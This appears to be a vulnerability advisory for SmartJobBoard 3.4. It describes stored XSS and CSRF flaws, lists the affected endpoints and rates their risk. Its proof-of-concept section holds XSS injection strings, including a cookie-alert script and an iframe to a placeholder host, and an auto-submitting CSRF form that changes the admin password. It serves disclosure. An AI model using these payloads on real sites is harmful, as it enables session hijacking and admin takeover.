Details:
========
1.1
A persistent input validation vulnerabilities are detected in SmartJoBboard ver-3.4 build 5140
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
context manipulation. Exploitation requires low user inter action.

Vulnerable Module(s):
				[+] Create resume (name of resume, institution, major) are all parameters that are injectible
                                           /add-listing/?listing_type_id=Resume
                                [+] Sending a message (Title)
                                              /demo/private-messages/send/  
                                [+] Create a screening-questionnaires
                                            /screening-questionnaires/new/ 
                                [+] Creating a job
                                            /add-listing/?listing_type_id=Job

1.2
The bugs allow remote attackers to enforce the user (admin) to change his password,add a page, or create a new user (persistent)
Successful exploitation of the vulnerability can lead to creating a new admin account or create a new page.

Vulnerable Module(s):
                                                                [+] /admin/adminpswd/
                                                                [+] /admin/user-pages/
                                                                [+] /admin/users/


Proof of Concept:
=================
1.1
he issue can be exploited by an insert on the Created Object function with script code as value.
The result is the persistent execution out of the web application context. 

Strings: >"<<iframe src=http://xxxxx.com/>3</iframe> ... or >"<script>alert(document.cookie)</script><div style="1

2.1
<html>
<form  name="test" action="http://www.smartjobboard.com/demo/admin/adminpswd/" method="post">
<input type="hidden" name="action" value="change_admin_account"><br/>
<input type="hidden" name="USR_LOGIN" value="test"><br/>
<input type="hidden" name="new_name" value="admin"><br/>
<input type="hidden" name="old_password" value="admin"><br/>
<input type="hidden" name="new_password" value="admin2"><br/>
<input type="hidden" name ="new_password_confirm" value="admin2"<br/>
</form>
<script>document.test.submit();</script>
</html>


Risk:
=====
1.1
The security risk of the persisten input validation vulnerability is estimated as medium.

1.2
The security risk of the cross site request forgery vulnerability is estimated as low.
